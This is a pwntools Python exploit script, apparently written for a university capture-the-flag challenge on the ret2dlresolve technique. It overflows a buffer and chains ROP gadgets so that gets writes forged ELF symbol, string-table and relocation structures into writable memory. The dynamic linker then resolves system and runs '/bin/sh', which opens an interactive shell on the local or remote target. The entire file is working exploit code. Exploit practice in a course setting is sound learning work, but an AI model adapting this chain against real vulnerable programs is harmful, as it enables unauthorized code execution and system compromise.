from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break vuln
continue
'''

if args.REMOTE:
   #libc = ELF('./libc6_2.28-0ubuntu1_amd64.so',checksec=False)\
   libc = e.libc
   rlib = ROP(libc)
else:
   libc = e.libc
   rlib = ROP(libc)
#libc = e.libc
def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-ret2dlresolve-1.chals.io", 443, ssl=True, sni="cse4850-ret2dlresolve-1.chals.io")
    else:
        return process(e.path)


p = start()



jmp_rel = 0x4005d0
symbtab = 0x4003d0
strtab = 0x4004a8
pop_r10 = 0x40118d
mov_rdi = 0x401190
ret = 0x401016
init_plt= 0x401020
fini = 0x40125c

#FAKE AREA
writeable_mem    = 0x404e10
fake_strtab      = writeable_mem
fake_symbtab     = writeable_mem + 0x18
fake_rel         = writeable_mem + 0x38
fake_args        = writeable_mem + 0x50

#fake_strtab = b'system' + b'\x00\x00'

print((fake_rel-jmp_rel)/24)

dl_resolve_index = int((fake_rel-jmp_rel)/24)
st_shndex = fake_strtab - strtab
r_info = int((fake_symbtab - symbtab) / 0x18) << 32 | 0x7

chain = cyclic(16)
chain += p64(ret)
chain += p64(pop_r10)                   # moves to r10 and then later rdi in next gadget
chain += p64(writeable_mem)             # writeable memory outside the binary
chain += p64(fini)                      # fini return
chain += p64(mov_rdi)                   # moves r10 to rdi
chain += p64(e.plt['gets'])

chain += p64(pop_r10)
chain += p64(fake_args)
chain += p64(fini)
chain += p64(mov_rdi)
chain += p64(init_plt)
chain += p64(dl_resolve_index)

p.sendline(chain)

# Symbol Name
payload = b'system\x00\x00' # st_name (symbol name)
payload += p64(0) # st_info (symbol type and handling)
payload += p64(0) # st_other (symbol visibiliyt)
# Elf64 Symbol Struct
payload += p64(st_shndex) # st_shndex (section index)
payload += p64(0) # st_value (symbol value)
payload += p64(0) # st_size (symbol size)
payload += p64(0) # padding
# Elf64_Rel Struct
payload += p64(writeable_mem) # r_offset (address)
payload += p64(r_info) # r_info (reloc type and index)
payload += p64(0) # padding

payload += b'/bin/sh\0'
p.sendline(payload)
p.interactive()

#p.sendlineafter(b'-------------------------------------',chain)
#p.interactive()


